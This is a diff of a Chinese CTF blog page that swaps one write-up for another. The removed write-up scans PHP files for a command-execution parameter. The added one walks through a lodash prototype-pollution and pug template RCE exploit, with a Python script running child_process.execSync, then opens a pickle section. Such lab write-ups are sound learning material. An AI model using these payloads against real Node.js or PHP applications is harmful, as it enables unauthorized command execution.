@@ -18,7 +18,7 @@
   <meta name="author" content="KKfine&#39;s blog">
   <meta name="keywords" content="">
   
-  <title>buu上强网杯高明的黑客 - KKfine&#39;s blog</title>
+  <title>巅峰极客总结 - KKfine&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -158,12 +158,12 @@
 </nav>
 
     <div class="banner" id="banner" parallax=true
-         style="background: url('/img/8.jpg') no-repeat center center;
+         style="background: url('/img/10.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="buu上强网杯高明的黑客">
+            <span class="h2" id="subtitle" title="巅峰极客总结">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-04-19 20:33" pubdate>
-        2021年4月19日 晚上
+      <time datetime="2021-08-09 13:06" pubdate>
+        2021年8月9日 下午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      449 字
+      691 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      6
+      10
        分钟
     </span>
   
@@ -225,13 +225,35 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">buu上强网杯高明的黑客</h1>
+            <h1 style="display: none">巅峰极客总结</h1>
             
             <div class="markdown-body">
-              <h2 id="buu上强网杯高明的黑客"><a href="#buu上强网杯高明的黑客" class="headerlink" title="buu上强网杯高明的黑客"></a>buu上强网杯高明的黑客</h2><p><img src="https://img-blog.csdnimg.cn/20210419233615169.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>入题就是直接给了一个压缩包下载下来之后会发现是超级多的php代码有点像日志，打开后浏览一下就会发现很多post get参数，还有内敛执行命令，猜测可以利用某个参数来进行命令执行，思路很简单，这题考的应该就是脚本能力。<br><img src="https://img-blog.csdnimg.cn/20210419233751848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>代码如下，写脚本过程挺难受，也试过多线程但最后总是一些数据连在一起，目前还没解决，最后拿了大佬的脚本跑也没跑出来，下面的脚本还是用的笨方法，回头再研究一下多线程的问题吧。</p>
-<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>s = requests.session()<br>rootdir = <span class="hljs-string">&#x27;D:\pythonwp\\buuweb\强网杯\src&#x27;</span><br>file_list = os.listdir(rootdir)<br>useful_param = []<br>flag = <span class="hljs-number">0</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>(<span class="hljs-params">file</span>):</span><br>    <span class="hljs-keyword">global</span> flag<br>    <span class="hljs-keyword">global</span> useful_param<br>    <span class="hljs-comment"># print(&quot;try&quot;)</span><br>    re_GETpayload = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>,)<br>    re_POSTpayload = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>)<br>    path = os.path.join(rootdir, file)<br>    <span class="hljs-comment"># print(path)</span><br>    url = <span class="hljs-string">&#x27;http://93dec788-f1ac-4f32-99e4-943960f2f002.node3.buuoj.cn/&#x27;</span> + file<br>    <span class="hljs-built_in">print</span>(url)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-comment"># print(f.read())</span><br>        res = f.read()<br>        GET_param = re.findall(re_GETpayload,res)<br>        POST_param = re.findall(re_POSTpayload,res)<br>    <span class="hljs-keyword">if</span> file == <span class="hljs-string">&#x27;xk0SzyKwfzw.php&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(GET_param)<br>        <span class="hljs-built_in">print</span>(POST_param)<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(POST_param)):<br>        <span class="hljs-built_in">print</span>(POST_param[k])<br>        res_post = s.post(url=url, data=&#123;POST_param[k]: <span class="hljs-string">&#x27;echo hello&#x27;</span>&#125;)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">in</span> res_post.text:<br>            <span class="hljs-comment"># useful_param.append(data)</span><br>            <span class="hljs-built_in">print</span>(POST_param[k])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ok&quot;</span>)<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(GET_param)):<br>        payload = url + <span class="hljs-string">&quot;?&quot;</span> + GET_param[k] + <span class="hljs-string">&quot;=&quot;</span> + <span class="hljs-string">&#x27;echo hello&#x27;</span><br>        <span class="hljs-comment"># print(payload)</span><br>        <span class="hljs-comment"># print(data)</span><br>        res_get = s.get(url=payload)<br>        <span class="hljs-keyword">if</span> file == <span class="hljs-string">&#x27;xk0SzyKwfzw.php&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;hello&#x27;</span> <span class="hljs-keyword">in</span> res_get.text:<br>            <span class="hljs-comment"># useful_param.append(data)</span><br>            <span class="hljs-built_in">print</span>(GET_param[k])<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_list)-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):										<span class="hljs-comment">#加入多线程</span><br>   <span class="hljs-comment"># t = threading.Thread(target=exp,args=(file_list[i],))</span><br>   <span class="hljs-comment"># t.start()</span><br>   exp(file_list[i])<br>   <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<br>       <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210420003856335.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>结果如上，可以发现可利用的php文件是xk0SzyKwfzw.php，参数为Efa5BVG，最后构造payload为Efa5BVG=cat /flag即可得到flag<br><img src="https://img-blog.csdnimg.cn/20210420003924620.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+              <h1 id="EZJS"><a href="#EZJS" class="headerlink" title="EZJS"></a>EZJS</h1><p>一点都不ez，看了一下午还是没做出来，感觉要被开了，以前没咋遇到过js的原型链污染，现学了一下原理但还是没找不到链，属实自己的js水平太烂了。</p>
+<p>这里用到的原型链污染原理参考:<a target="_blank" rel="noopener" href="https://paper.seebug.org/1426/#_1">https://paper.seebug.org/1426/#_1</a></p>
+<p>pug的rce漏洞原理参考：<a target="_blank" rel="noopener" href="https://github.com/pugjs/pug/issues/3312">https://github.com/pugjs/pug/issues/3312</a></p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>随便登录后可以在<code>newimg</code>发现文件读取。可以先读取<code>package.json</code>,<code>package-lock.json</code>看看版本。</p>
+<p><img src="https://img-blog.csdnimg.cn/5eda8a13f65c4647acc9b3d120cf2840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><code>lodash</code>&lt;4.17.17时存在原型链污染漏洞，pug有rce命令执行。看一下<code>index.js</code>源码，核心部分如下。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript">router.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  <span class="hljs-comment">//req.session.debug = true;</span><br><br>  <span class="hljs-keyword">if</span> (req.session.username !== <span class="hljs-literal">undefined</span> &amp;&amp; req.session.isadmin !== <span class="hljs-literal">undefined</span>) &#123;<br><br>    <span class="hljs-keyword">if</span> (req.query.newimg !== <span class="hljs-literal">undefined</span>) req.session.img = req.query.newimg;<br><br>    <span class="hljs-keyword">var</span> imgdata = fs.readFileSync(req.session.img? req.session.img: <span class="hljs-string">&quot;./images/1.png&quot;</span>);<br>    <span class="hljs-keyword">var</span> base64data = Buffer.from(imgdata, <span class="hljs-string">&#x27;binary&#x27;</span>).toString(<span class="hljs-string">&#x27;base64&#x27;</span>);<br><br>    <span class="hljs-keyword">var</span> info = &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;我的空间&#x27;</span>, <span class="hljs-attr">msg</span>: req.session.username, <span class="hljs-attr">png</span>: <span class="hljs-string">&quot;data:image/png;base64,&quot;</span> + base64data, <span class="hljs-attr">diy</span>: <span class="hljs-string">&quot;十年磨一剑v0.0.0(尚处于开发版&quot;</span>&#125;;<br><br><br>    <span class="hljs-keyword">if</span> (req.session.isadmin !== <span class="hljs-string">&quot;notadmin&quot;</span>) &#123;<br><br>      <span class="hljs-keyword">if</span> (req.session.debug !== <span class="hljs-literal">undefined</span> &amp;&amp; req.session.debug !== <span class="hljs-literal">false</span>) info.pretty = req.query.p;<br>      <span class="hljs-keyword">if</span> (req.query.diy !== <span class="hljs-literal">undefined</span>) req.session.diy = req.query.diy;<br>      info.diy = req.session.diy ? req.session.diy: <span class="hljs-string">&quot;尊贵的admin&quot;</span>;<br>      <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;admin&#x27;</span>, info);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;admin&#x27;</span>, info);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.render(<span class="hljs-string">&#x27;msg&#x27;</span>, &#123;<span class="hljs-attr">title</span>: <span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;plz login first&#x27;</span>&#125;);<br>  &#125;<br>&#125;);<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>这个地方就是可以读取源码的漏洞原因。</p>
+<p><img src="https://img-blog.csdnimg.cn/068344140be04497ad8f415f499b424d.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>往下看，判断<code>req.session.isadmin !== &quot;notadmin&quot;</code>，然后的判断是关键。这里需要将<code>req.session.debug</code>污染成空值或其他的满足条件的来绕过，然后就可以利用<code>pug</code>的RCE来执行命令。</p>
+<p><img src="https://img-blog.csdnimg.cn/9cc5405b335c4fdfac77ae4691fa660b.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这里需要注意的是参考文章里面的<code>payload</code>中存在转义号，这是因为那个里面用了<code>json</code>解析，则要用转义号转移引号，这里则不需要。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;http://localhost:5000/&quot;</span><br>session=requests.session()<br>session.post(url+<span class="hljs-string">&#x27;login&#x27;</span>,data=&#123;<br>    <span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">26</span>,<br>    <span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">26</span><br>&#125;)<br>payload=&#123;<span class="hljs-string">&#x27;&quot;].__proto__[&quot;isadmin&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>,<br><span class="hljs-string">&#x27;&quot;].__proto__[&quot;debug&#x27;</span>: <span class="hljs-string">&#x27;123&#x27;</span>&#125;<br>r=session.get(url+<span class="hljs-string">&#x27;admin&#x27;</span>,params=&#123;<br>    <span class="hljs-string">&quot;p&quot;</span>:<span class="hljs-string">&quot;&#x27;);return process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;tac /root/flag.txt&#x27;);_=(&#x27;&quot;</span><br>&#125;,data=payload)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>中间很多自己node搭环境调试的过程就懒得贴了，总结一下编程代码功底还是最基础的东西呀！！！</p>
+<h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><p>考的是<code>pickle</code>的知识</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/264363.html">https://www.freebuf.com/articles/web/264363.html</a></p>
+<p>​            <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a></p>
+<p><code>pickle.dumps</code>将对象反序列化为字符串，<code>pickle.dump</code>将反序列化后的字符串存储为文件。</p>
+<p><code>pickle.loads() </code>对象反序列化 <code>pickle.load()</code> 对象反序列化，从文件中读取数据。</p>
 
             </div>
             <hr>
@@ -241,7 +263,7 @@
                   <div class="post-meta mr-3">
                     <i class="iconfont icon-category"></i>
                     
-                      <a class="hover-with-bg" href="/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">buu刷题记录</a>
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
                     
                   </div>
                 
@@ -251,7 +273,7 @@
                     
                       <a class="hover-with-bg" href="/tags/web/">web</a>
                     
-                      <a class="hover-with-bg" href="/tags/BUU/">BUU</a>
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
                     
                   </div>
                 
@@ -268,18 +290,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/04/30/2021-6-26-Shrio721/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Apache Shiro 反序列化漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/04/18/2021-4-16-BUU%E4%B8%80%E9%81%93%E5%85%B3%E4%BA%8E%E6%B3%A8%E5%85%A5%E7%9A%84%E9%A2%98/">
-                        <span class="hidden-mobile">BUU一道关于注入的题</span>
+                      <a href="/2021/08/02/2021-8-1-%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                        <span class="hidden-mobile">关于反序列化中原生类的利用</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
